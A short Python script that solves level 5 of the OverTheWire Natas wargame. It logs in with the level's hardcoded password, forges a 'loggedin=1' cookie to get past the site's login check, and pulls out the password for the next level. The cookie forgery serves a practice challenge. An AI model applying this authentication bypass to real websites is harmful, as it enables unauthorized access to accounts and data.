#!/usr/bin/env python

import requests
import re

username='natas5'
password='iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

cookie = { "loggedin" : "1" }
referer_url = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()			#When working with sessions first create a session and then get or post request for that URL
response = session.get(url, auth = (username, password), cookies=cookie)
# content = response.cookies
content = response.text
# print content

print re.findall('The password for natas6 is (.*)</div>', content)[0]
# Even after logging in with the credentials, it says "you are not logged in". Hence, we use the cookies to make sure that we are logged in
# On checking the cookies a value 'loggedin=0 was seen. So we passed the value in the header'